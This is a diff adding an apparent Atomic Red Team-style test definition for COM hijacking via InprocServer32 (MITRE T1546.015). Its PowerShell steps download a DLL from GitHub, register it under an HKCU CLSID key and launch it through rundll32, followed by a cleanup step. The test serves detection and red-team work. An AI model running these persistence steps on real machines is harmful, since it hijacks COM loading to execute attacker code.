@@ -1,0 +1,48 @@
+api_version: "2.0"
+name: COM Hijacking - InprocServer32
+description: |-
+    This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+    Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+args:
+    - name: clsid_threading
+      type: string
+      default: Apartment
+    - name: dllpath
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll
+    - name: clsid
+      type: string
+      default: '{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+    - name: clsid_description
+      type: string
+      default: MSAA AccPropServices
+uuid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.015: Component Object Model Hijacking'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: DLL For testing
+      inline: |-
+        if (Test-Path "#{dllpath}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
+        }}
+      executor: powershell
+    - name: com-hijacking---inprocserver32
+      inline: |-
+        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}' -Value '{{.Args.clsid_description}}'
+        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}\InprocServer32' -Value "{{.Args.dllpath}}"
+        New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}\InprocServer32' -Name 'ThreadingModel' -Value '{{.Args.clsid_threading}}' -PropertyType "String"
+        Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta {{.Args.clsid}}'
+      executor: powershell
+      cleanup:
+        inline: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}' -Recurse -ErrorAction Ignore
+        executor: powershell
